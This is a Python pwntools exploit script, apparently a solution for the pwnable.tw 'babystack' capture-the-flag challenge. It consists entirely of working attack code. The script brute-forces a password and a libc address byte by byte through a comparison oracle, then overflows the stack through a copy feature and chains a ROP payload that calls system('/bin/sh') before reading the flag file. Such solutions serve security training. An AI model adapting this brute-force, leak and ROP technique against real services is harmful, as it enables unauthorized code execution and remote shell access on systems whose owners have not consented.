
from pwn import *
debug = 0
elf = ELF('./babystack')
context(arch='amd64',os='linux',endian='little')
if debug:
	p = process('./babystack')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	#context.kernel = 'amd64'
	#off = 0x001b2000
	#context.log_level = 'debug'
	#gdb.attach(p)
	gdb.attach(p,'vmmap')
else:
	p = remote('chall.pwnable.tw', 10205)
	libc = ELF('./libc_64.so.6')
	#off = 0x001b0000

buf = ''
for i in range(16):
	p.recvuntil('>>')
	p.sendline('1')
	pro = log.progress('pass')
	for j in range(1,256):
		pro.status('trying '+ str(i) + ' : ' + hex(j))
		p.recvuntil('Your passowrd :')
		p.send(buf+chr(j)+'\0')
		result = p.recvline()
		if 'Success' in result:
			p.sendline('1')
			pro.success('find '+ str(i) + ':' + hex(j))
			#libc_addr+= j<<(8*i)
			buf += chr(j)
			break
		elif 'Failed' in result:
			p.sendline('1')
			pass
		else :
			print '[-] reveive result error'
			exit(-1)

print len(buf)

p.recvuntil('>>')
p.sendline('1')
p.recvuntil('Your passowrd :')
p.send('\0'.ljust(0x48,'a'))


p.recvuntil('>>')
p.sendline('3')
p.recvuntil('Copy :')
p.send('b'*0x3)
p.recvuntil('>>')
p.sendline('1')

libc_addr =0
leak_exp = 'a'*8
for i in range(6):
	p.recvuntil('>>')
	p.sendline('1')
	pro = log.progress('pass')
	for j in range(1,256):
		pro.status('trying '+ str(i) + ' : ' + hex(j))
		p.recvuntil('Your passowrd :')
		p.send(leak_exp+chr(j)+'\0')
		result = p.recvline()
		if 'Success' in result:
			p.sendline('1')
			pro.success('find '+ str(i) + ':' + hex(j))
			libc_addr+= j<<(8*i)
			leak_exp += chr(j)
			break
		elif 'Failed' in result:
			p.sendline('1')
			pass
		else :
			print '[-] reveive result error'
			exit(-1)

libc.address = libc_addr - 1 -libc.symbols['_IO_file_setbuf'] -8
print hex(libc.symbols['system'])
print hex(next(libc.search('/bin/sh')))


rop = ROP(libc)
#rop.system(next(libc.search('/bin/sh')))
rop.call(libc.symbols['system'],[next(libc.search('/bin/sh'))])
print rop.dump()
zero_list = []
rop_str = str(rop)
rop_str = list(rop_str)
j = 0
for i in rop_str:
	if i == '\0':
		zero_list.append(j)
		rop_str[j] = 'a'
	j+=1
#rop_str.replace('\x00','a')
print len(rop_str),':',rop_str
print zero_list
rop_str = ''.join(rop_str)
print len(rop_str)
zero_list.reverse()
print zero_list
shellcode = '\0'.ljust(0x40,'a')+buf+'a'*0x10+p64(0xbabecafebabecafe)

p.recvuntil('>>')
p.sendline('1')
p.recvuntil('Your passowrd :')
p.send('\0'.ljust(0x40,'a')+buf+'a'*0x10+p64(0xbabecafebabecafe)+rop_str)
p.recvuntil('>>')
p.sendline('3')
p.recvuntil('Copy :')
p.send('b'*0x3)
p.recvuntil('>>')


for i in range(len(zero_list)):
	p.sendline('1')
	p.recvuntil('>>')
	p.sendline('1')
	p.recvuntil('Your passowrd :')
	p.send('\0'.ljust(0x40,'a')+buf+'a'*0x10+p64(0xbabecafebabecafe)+rop_str[0:zero_list[i]]+'\0')
	#print '\0'.ljust(0x40,'a')+buf+'a'*0x10+p64(0xbabecafebabecafe)+rop_str[0:zero_list[i]]+'\0'
	p.recvuntil('>>')
	p.sendline('3')
	p.recvuntil('Copy :')
	p.send('b'*0x3)
	p.recvuntil('>>')
	



p.sendline('2')
p.sendline('cat /home/babystack/flag')
p.interactive()